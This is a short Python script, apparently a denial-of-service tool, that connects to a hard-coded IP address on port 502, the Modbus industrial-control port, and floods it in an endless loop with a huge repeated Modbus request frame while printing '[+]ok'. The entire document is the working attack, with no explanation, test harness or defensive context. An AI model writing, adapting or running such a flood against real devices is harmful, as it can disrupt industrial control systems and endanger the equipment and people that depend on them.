import socket
w = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
w.connect(('209.124.145.124', 502))
d=b'\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x01'*9000
db = d*8000
while(True):
    print("[+]ok ")
    w.send(db)
